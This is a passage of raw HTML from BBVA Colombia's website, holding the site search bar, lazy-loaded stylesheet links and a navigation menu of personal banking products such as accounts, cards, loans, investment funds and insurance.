                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.searchbar/small.lc-20230516-100300-lc.min.ACSHASH7c002576cf107564c91c1df63afb2106.css" type="text/css">



                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.searchbar/large.lc-20230516-100300-lc.min.ACSHASH53d993f0ab9fd1e20813b342ddd6dd7f.css" type="text/css" media="all and (min-width: 600px)">



                    <div class="search__base " itemscope data-component="search" data-component-params='{"open": false, "version" : 1, "idWeb" : ""}' data-search-url="https://bbva-proxy-cloudsearch-sp.appspot.com/v1/cloudsearch/suggest?max=15&amp;site=colombia&amp;access=p&amp;format=os&amp;client=colombia&amp;q=&lt;query>" data-search-query="&lt;query>" aria-hidden="false">
                        <div class="container">
                            <link>
                                <div class="container search__bar">
                                    <form action="/personas/buscador.html" class="search__form" itemprop="potentialAction" itemscope itemtype="http://schema.org/SearchAction">
                                        <meta itemprop="target" content="/personas/buscador.html?_charset_=UTF-8&q={search}"/>
                                        <input type="hidden" value="UTF-8" name="_charset_"/>
                                        <button type="submit" tabindex="2" class="search__icon-btn" aria-label="Hacer búsqueda">
                                            <i class="bbva-icon bbva-icon__3_001_search"></i>
                                        </button>
                                        <div class="search__label" role="combobox" aria-expanded="false" aria-haspopup="listbox">
                                            <label class="search__txt">Hacer búsqueda, Pulsa enter</label>
                                            <input tabindex="1" aria-autocomplete="list" autocomplete="off" type="text" name="search" placeholder="Buscar aquí" class="search__input" aria-label="Hacer búsqueda, Pulsa enter" aria-activedescendant="" itemprop="query-input"/>
                                        </div>
                                        <span class="search__instructional-text">Pulsa enter</span>
                                        <button class="search__close-btn" tabindex="3" aria-label="Cerrar formulario de búsqueda">
                                            <i class="bbva-icon bbva-icon__2_022_close"></i>
                                        </button>
                                        <input type="submit" value="Search" class="hidden search__hiddeninput"/>
                                    </form>
                                    <div class="search__container">
                                        <div class="search__suggestions">
                                            <span class="search__suggestions__title">Sugerencias</span>
                                            <ul role="listbox" class="search__suggestions__container"></ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="wrapper">



                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenu/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        <!-- nuevo5 -->

                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenu/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        <!-- nuevo5 (fin) -->

                        <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenu/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.swiper.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

                        
                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.slider.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        
                        <!-- nuevo6 -->
                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.animations.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        <!-- nuevo6 (fin) -->

                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenucard/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">


                        <!-- nuevo7 -->
                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenucard/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        <!-- nuevo7 (fin) -->


                        <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.megamenucard/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.accordion/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

                        <!-- nuevo8 -->
                        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.accordion/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
                        <!-- nuevo8 (fin) -->

                        <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.accordion/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                        <aside class="animations__menu megamenu__container hidden" id="megamenu__aside" aria-hidden="true" data-component="megamenu" data-component-params='{
                           "menuClosed": "",
                           "menuOpen": ""
                       }' itemscope itemtype="http://www.schema.org/SiteNavigationElement">

                        <div class="megamenu__fixed">
                            <div class="megamenu__navigation__container">
                                <div class="megamenu__navigation accordion--mobile" itemscope itemtype="http://www.schema.org/SiteNavigationElement">
                                    <div class="megamenu__flyout--nonmobile">
                                        <nav class="megamenu__flyout ">
                                            <div itemprop="name" class="megamenu__flyout__title">Productos</div>
                                            <a href="#" class="megamenu__navigation__home"><i aria-hidden="true" class="bbva-icon bbva-icon__3_002_home"></i>Inicio</a>
                                        <ul class="megamenu__flyout__list" itemscope itemtype="http://schema.org/ListItem" role="list">
                                            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
                                                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="cuentas" href="/personas/productos/cuentas.html">
                                                    <span itemprop="name" class="megamenu__navigation__text">Cuentas</span>
                                                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                                                </a>
            
                
                                                <div class="megamenu__flyout__secondary accordion__list" data-menu-name="cuentas" aria-expanded="false" aria-hidden="true" data-accordion-content>
                                                    <div class="accordion__list__content">
                                                        <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/cuentas.html">
                                                            <span itemprop="name">Cuentas</span>
                                                        </a>
                                                        <div class="accordion__list__content--haschilden">
                                                            <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/en-linea.html">
                                                                <span class="megamenu__navigation__title" itemprop="name">Cuenta en Línea</span>
                                                            </a>
                                                            <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/nomina.html">
                                                                <span class="megamenu__navigation__title" itemprop="name">Cuentas de Nómina</span>
                                                            </a>
                                                            <ul>
                                                                <li>
                                                                    <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/cuentas/nomina/pensionados.html">
                                                                        <span itemprop="item name">Cuenta de Nómina para Pensionados</span>
                                                                    </a>
                                                                </li>
                                                            </ul>

                                                            <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/ahorro.html">
                                                                <span class="megamenu__navigation__title" itemprop="name">Cuentas de Ahorro</span>
                                                            </a>

                                                            <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/corriente.html">
                                                                <span class="megamenu__navigation__title" itemprop="name">Cuentas Corrientes</span>
                                                            </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/portafolios.html">
                    <span class="megamenu__navigation__title" itemprop="name">Portafolios</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/cuentas.html">
                        <span itemprop="item name">cuentas</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

            
        </li>
        
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="tarjetas" href="/personas/productos/tarjetas.html">
                <span itemprop="name" class="megamenu__navigation__text">Tarjetas</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
            
                
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="tarjetas" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/tarjetas.html">
                <span itemprop="name">Tarjetas</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/credito.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas de Crédito</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/visa.html">
                                <span itemprop="item name">Tarjetas Visa</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/mastercard.html">
                                <span itemprop="item name">Tarjetas Mastercard</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/amparada.html">
                                <span itemprop="item name">Tarjeta Amparada</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/debito.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjeta Débito</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/puntos-y-promociones.html">
                    <span class="megamenu__navigation__title" itemprop="name">Puntos y promociones</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/pago-con-puntos.html">
                        <span itemprop="item name">Pago con puntos</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/avances.html">
                        <span itemprop="item name">Avances</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/beneficios.html">
                        <span itemprop="item name">Beneficios</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

            
        </li>
        
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="prestamos" href="/personas/productos/prestamos.html">
                <span itemprop="name" class="megamenu__navigation__text">Préstamos</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="prestamos" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/prestamos.html">
                <span itemprop="name">Préstamos</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/online.html">
                    <span class="megamenu__navigation__title" itemprop="name">Préstamos en Línea</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/vivienda.html">
                    <span class="megamenu__navigation__title" itemprop="name">Créditos de Vivienda</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/consumo.html">
                    <span class="megamenu__navigation__title" itemprop="name">Créditos de Consumo</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/vehiculo.html">
                    <span class="megamenu__navigation__title" itemprop="name">Crédito de Vehículo</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/servicios-digitales/adelanto-de-nomina.html">
                        <span itemprop="item name">Adelanto de Nómina</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/prestamos/consumo/libranza.html">
                        <span itemprop="item name">Crédito de Libranza</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

            
        </li>
        
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="inversion" href="/personas/productos/inversion.html">
                <span itemprop="name" class="megamenu__navigation__text">Inversiones</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
            
                
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="inversion" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/inversion.html">
                <span itemprop="name">Inversiones</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/inversion/cdt.html">
                    <span class="megamenu__navigation__title" itemprop="name">CDT</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/online.html">
                                <span itemprop="item name">CDT Online</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/tradicional.html">
                                <span itemprop="item name">CDT Tradicionales</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/largo-plazo.html">
                                <span itemprop="item name">CDT Largo Plazo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/tasa-variable-dtf.html">
                                <span itemprop="item name">CDT Tasa Variable</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/inversion/fondos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Fondos de Inversión </span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/digital.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Digital</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/paramo.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Páramo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/efectivo.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Efectivo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/pais.html">
                                <span itemprop="item name">Fondo de Inversión BBVA País</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/fam.html">
                                <span itemprop="item name">Fondo de Inversión BBVA FAM</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/plazo-30.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Plazo 30</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/balanceado-global.html">
                                <span itemprop="item name">Fondo de Inversión Balanceado Global</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/balanceado-gaia.html">
                                <span itemprop="item name">Fondo de Inversión Balanceado Gaia</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/multiestrategia.html">
                                <span itemprop="item name">Fondos Multiestrategias</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            
        </div>
    </div>

            
        </li>
        
    
        
        <li class="megamenu__navigation__list__item">
            <a tabindex="0" class="megamenu__navigation__link accordion--nosubmenu" href="/personas/productos/pensionados.html">
                <span itemprop="name" class="megamenu__navigation__text">Pensionados</span>
            </a>
        </li>
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="seguros" href="/personas/productos/seguros.html">
                <span itemprop="name" class="megamenu__navigation__text">Seguros</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
            
                
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="seguros" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/seguros.html">
                <span itemprop="name">Seguros</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/seguros/libres.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Libres</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/soat.html">
                                <span itemprop="item name">SOAT Virtual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/oncologico.html">
                                <span itemprop="item name">Seguro Oncológico</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/familia-vital.html">
                                <span itemprop="item name">Seguro de Familia Vital</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hogar-y-contenidos.html">
                                <span itemprop="item name">Seguro Hogar y Contenidos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/autos.html">
                                <span itemprop="item name">Seguro de Autos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hurto-de-tarjeta.html">
                                <span itemprop="item name">Seguro de Hurto de Tarjeta</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/accidentes-personales-salud.html">
                                <span itemprop="item name">Seguro de Accidentes Personales Salud</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hurto-atm.html">
                                <span itemprop="item name">Seguro de Hurto ATM</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/multiriesgo-hogar.html">
                                <span itemprop="item name">Seguro Multiriesgo para Hogar</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/vida-individual.html">
                                <span itemprop="item name">Seguro de Vida Indivual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hogar-individual.html">
                                <span itemprop="item name"> Seguro de Hogar Individual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/cuota-segura-trabajadores-dependientes.html">
                                <span itemprop="item name">Seguro Cuota Segura Trabajadores Dependientes</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/cuota-segura-trabajadores-independientes.html">
                                <span itemprop="item name">Seguro Cuota Segura Trabajadores Independientes</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/seguros/deudores.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Deudores</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vida.html">
                                <span itemprop="item name">Seguro de Vida Colectivo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vehiculos.html">
                                <span itemprop="item name">Seguro de Vehículos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/tarjeta-de-credito.html">
                                <span itemprop="item name">Seguro de Vida para Tarjetas de Crédito</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vida-colectivo.html">
                                <span itemprop="item name">Seguro Vida Colectivo Crédito Hipotecario y/o Leasing Habitacional</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/incendio-y-terremoto.html">
                                <span itemprop="item name">Seguro de incendio y terremoto para créditos hipotecario y/o leasing habitacional</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/seguro-todo-riesgo-construccion.html">
                                <span itemprop="item name">Seguro Todo Riesgo Construcción</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            
        </div>
    </div>

            
        </li>
        
    
        
        <li class="megamenu__navigation__list__item">
            <a tabindex="0" class="megamenu__navigation__link accordion--nosubmenu" href="/personas/productos/divisas.html">
                <span itemprop="name" class="megamenu__navigation__text">Divisas</span>
            </a>
        </li>
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="banca-personal" href="/personas/productos/banca-personal.html">
                <span itemprop="name" class="megamenu__navigation__text">Banca Personal</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="banca-personal" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/banca-personal.html">
                <span itemprop="name">Banca Personal</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/inversion.html">
                    <span class="megamenu__navigation__title" itemprop="name">Inversión Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/cuentas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/tarjetas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/prestamos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Préstamos Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/seguros.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Banca Personal</span>
                </a>
                
                
            </div>
            
        </div>
    </div>

            
        </li>
        
    
        <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}' class="megamenu__navigation__list__item">
            <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="premium" href="/personas/productos/premium.html">
                <span itemprop="name" class="megamenu__navigation__text">Premium</span>
                <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
            </a>
            
                
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="premium" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/premium.html">
                <span itemprop="name">Premium</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/inversion.html">
                    <span class="megamenu__navigation__title" itemprop="name">Inversión Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/cuentas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/tarjetas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/prestamos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Financiación Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/seguros.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Premium</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/premium/soluciones-no-financieras.html">
                        <span itemprop="item name">Soluciones No Financieras</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

            
        </li>
        
    
        
        <li class="megamenu__navigation__list__item">
            <a tabindex="0" class="megamenu__navigation__link accordion__list__item__heading" href="/personas/productos/banca-privada.html">
                <span itemprop="name" class="megamenu__navigation__text">Banca privada</span>
            </a>
        </li>
    </ul>

    
<div class="megamenu__flyout__linkwithicon" itemscope itemtype="http://schema.org/Service">
    
    
        
        

    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.linkwithicon.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">





    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" href="/personas/servicios-digitales.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/2_042_nearme.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Servicios digitales</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_560657055" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " href="https://www.bbva.com.co/personas/productos/sostenibilidad.html" target="_self" title="Sostenibilidad BBVA" aria-label="Sostenibilidad BBVA">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/generic-sustainability.svg" alt=""/>
